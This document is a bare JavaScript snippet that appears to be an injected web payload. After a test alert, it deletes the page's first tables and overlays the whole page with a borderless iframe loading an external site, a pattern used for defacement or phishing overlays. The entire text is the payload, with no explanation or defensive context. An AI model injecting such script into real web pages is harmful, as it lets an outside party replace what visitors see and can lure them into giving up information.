alert("hello");
parent = document.getElementsByTagName('body')[0];
var descendants = parent.getElementsByTagName('table');
parent.removeChild(descendants[0]);
parent = document.getElementsByTagName('body')[0];
var descendants = parent.getElementsByTagName('table');
parent.removeChild(descendants[0]);
document.body.innerHTML += '<iframe src="http://computerperfect.be/Test/User/Test/Myro.html" height="100%" width="100%" style="border: 0"></iframe>'

